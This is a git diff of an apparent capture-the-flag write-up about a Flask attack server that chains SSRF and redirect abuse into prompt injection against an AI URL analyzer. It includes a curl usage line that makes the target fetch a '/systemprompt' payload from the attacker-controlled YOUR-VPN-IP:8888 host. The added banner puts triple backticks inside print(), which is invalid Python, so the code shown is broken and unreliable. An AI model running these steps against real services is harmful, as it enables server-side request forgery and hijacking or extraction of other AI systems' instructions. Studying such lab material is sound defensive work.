@@ -124,6 +124,8 @@ The attacker  set up a Flask development server at `YOUR-VPN-IP:8888` with endpo
 - `/analyze` - Process URLs through SSRF chain
 
 ```python
+#!/usr/bin/env python3
+
 from flask import Flask, redirect
 
 app = Flask(__name__)
@@ -314,7 +316,20 @@ def index():
 </body></html>'''
 
 if __name__ == '__main__':
-    print("[*] SSRF AI Prompt Injection Server Starting...")
+    print(```
+
+  ============================================================
+    ███████╗███████╗██████╗ ███████╗     █████╗ ██╗
+    ██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔══██╗██║
+    ███████╗███████╗██████╔╝█████╗      ███████║██║
+    ╚════██║╚════██║██╔══██╗██╔══╝      ██╔══██║██║
+    ███████║███████║██║  ██║██║         ██║  ██║██║
+    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═╝  ╚═╝╚═╝
+
+                      SSRF + AI
+ 
+         Prompt Injection / Redirect Abuse Test Server
+ ============================================================```)
     print("[*] Server running on http://0.0.0.0:8888")
     print("\n[*] Usage examples:")
     print("    curl -X POST http://url-analyzer.hopaitech.thm/analyze -H 'Content-Type: application/json' -d '{\"url\":\"http://YOUR-VPN-IP:8888/systemprompt\"}'")
